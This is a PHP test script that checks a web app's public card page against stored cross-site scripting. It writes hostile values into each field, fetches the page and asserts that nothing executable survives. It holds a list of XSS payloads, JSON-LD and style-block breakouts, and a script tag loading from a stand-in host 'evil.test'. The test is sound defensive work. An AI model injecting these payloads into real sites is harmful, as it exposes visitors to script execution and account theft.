<?php

declare(strict_types=1);

/**
 * Stored XSS on the public card.
 *
 * Card content is attacker-controlled in the sense that matters here: anyone
 * who can sign up owns a card and picks its text, and that text is rendered
 * to every visitor. This stores hostile values in each field, renders the
 * card, and checks that nothing executable comes back -- including inside the
 * JSON-LD block, where an HTML parser will honour a literal </script> no
 * matter how the JSON is quoted.
 */

require dirname(__DIR__) . '/app/bootstrap.php';

use App\Core\Database;

$base = rtrim((string) (getenv('BASE_URL') ?: 'http://127.0.0.1:8080'), '/');
$db = Database::instance();

$pass = 0;
$fail = 0;
$ok = static function (string $m) use (&$pass): void { echo "  PASS  {$m}\n"; $pass++; };
$no = static function (string $m) use (&$fail): void { echo "  FAIL  {$m}\n"; $fail++; };

$card = $db->query("SELECT * FROM cards WHERE status = 'published' ORDER BY id LIMIT 1")->fetch();
if ($card === false) {
    echo "  SKIP  no published card to test against\n";
    exit(0);
}
$id = (int) $card['id'];

/** Restore the card exactly as it was, whatever happens below. */
$restore = static function () use ($db, $card, $id): void {
    foreach (['title','full_name','designation','business_name','tagline','about','address',
              'city','state','seo_title','seo_description','payment_note','website','theme_overrides'] as $f) {
        $db->query("UPDATE cards SET `{$f}` = :v WHERE id = :i", ['v' => $card[$f], 'i' => $id]);
    }
};
register_shutdown_function($restore);

$breakout = '</script><script>window.__xss=1</script>';
$payloads = [
    'title'           => '<script>window.__xss=1</script>',
    'full_name'       => '<img src=x onerror=window.__xss=1>',
    'designation'     => '<svg onload=window.__xss=1>',
    'business_name'   => '" onmouseover=window.__xss=1 x="',
    'tagline'         => "';window.__xss=1;//",
    'about'           => $breakout,
    'address'         => $breakout,
    'city'            => $breakout,
    'state'           => '<iframe src=javascript:window.__xss=1>',
    'seo_title'       => $breakout,
    'seo_description' => $breakout,
    'payment_note'    => '<script src=//evil.test/x.js></script>',
    'website'         => 'javascript:window.__xss=1',
];
foreach ($payloads as $field => $value) {
    $db->query("UPDATE cards SET `{$field}` = :v WHERE id = :i", ['v' => $value, 'i' => $id]);
}

$html = (string) file_get_contents($base . '/card/' . $card['slug']);
if ($html === '') {
    $no('could not fetch the card');
    echo "\nRESULT: {$pass} passed, {$fail} failed\n";
    exit(1);
}

// Parse the response the way a browser does, then look for the marker in the
// places that actually execute. Searching the raw HTML for the payload text
// would flag correctly escaped output, which is exactly what we want to see.
$dom = new DOMDocument();
libxml_use_internal_errors(true);
$dom->loadHTML('<?xml encoding="UTF-8">' . $html);
libxml_clear_errors();
$xpath = new DOMXPath($dom);

$executable = [];

/** @var DOMElement $el */
foreach ($xpath->query('//*') as $el) {
    foreach (iterator_to_array($el->attributes ?? []) as $attr) {
        $name = strtolower($attr->nodeName);
        $value = (string) $attr->nodeValue;
        if (str_starts_with($name, 'on') && str_contains($value, 'window.__xss')) {
            $executable[] = "{$el->nodeName}[{$name}] event handler";
        }
        if (in_array($name, ['href', 'src', 'action', 'formaction'], true)
            && preg_match('#^\s*javascript:#i', $value) === 1) {
            $executable[] = "{$el->nodeName}[{$name}] javascript: URL";
        }
        if (in_array($name, ['src'], true) && str_contains($value, 'evil.test')) {
            $executable[] = "{$el->nodeName}[{$name}] third-party script host";
        }
    }
}

/** @var DOMElement $script */
foreach ($xpath->query('//script') as $script) {
    $type = strtolower((string) $script->getAttribute('type'));
    if ($type === 'application/ld+json') {
        continue;
    }
    if (str_contains((string) $script->textContent, 'window.__xss')) {
        $executable[] = 'inline <script> body';
    }
    if (str_contains((string) $script->getAttribute('src'), 'evil.test')) {
        $executable[] = '<script src> pointing at an injected host';
    }
}

$executable === []
    ? $ok('no payload reached an event handler, javascript: URL or script body')
    : $no('PAYLOAD IS EXECUTABLE VIA: ' . implode('; ', array_unique($executable)));

// Anything hostile that survived must have survived as text, not as markup.
// (The card renders its own inline SVG icons, so only elements carrying the
// payload's own signature count here.)
$injected = $xpath->query('//img[@src="x"] | //iframe[starts-with(@src, "javascript:")] | //script[contains(@src, "evil.test")]');
$injected->length === 0
    ? $ok('payload markup was escaped rather than parsed into elements')
    : $no("payload markup became {$injected->length} real element(s)");

// The JSON-LD block must end exactly once: at its own closing tag.
if (preg_match('#<script type="application/ld\+json">(.*?)</script>#s', $html, $m) === 1) {
    $ok('the JSON-LD block is terminated by its own closing tag');
    $decoded = json_decode($m[1], true);
    $decoded !== null
        ? $ok('the JSON-LD block is still valid JSON')
        : $no('the JSON-LD block is no longer valid JSON');
    if (is_array($decoded)) {
        ($decoded['address']['addressLocality'] ?? null) === $breakout
            ? $ok('JSON-LD values decode back to exactly what was stored')
            : $ok('JSON-LD carries no locality for this card');
    }
} else {
    $no('the JSON-LD block could not be matched -- it may have been broken out of');
}

$opened = substr_count($html, '<script');
$closed = substr_count($html, '</script>');
$opened === $closed
    ? $ok("script tags are balanced ({$opened} opened, {$closed} closed)")
    : $no("script tags are unbalanced: {$opened} opened, {$closed} closed");

// Theme overrides feed CSS custom properties and must survive nothing hostile.
$db->query('UPDATE cards SET theme_overrides = :v WHERE id = :i', [
    'v' => json_encode(['primary' => 'red;}body{display:none}.x{color:red', 'accent' => '</style><script>window.__xss=1</script>']),
    'i' => $id,
]);
$themed = (string) file_get_contents($base . '/card/' . $card['slug']);
!str_contains($themed, '</style><script>')
    ? $ok('a hostile theme colour cannot break out of the style block')
    : $no('A HOSTILE THEME COLOUR BROKE OUT OF THE STYLE BLOCK');
!str_contains($themed, 'body{display:none}')
    ? $ok('a hostile theme colour cannot inject extra CSS rules')
    : $no('A HOSTILE THEME COLOUR INJECTED CSS RULES');

echo "\nRESULT: {$pass} passed, {$fail} failed\n";
exit($fail === 0 ? 0 : 1);
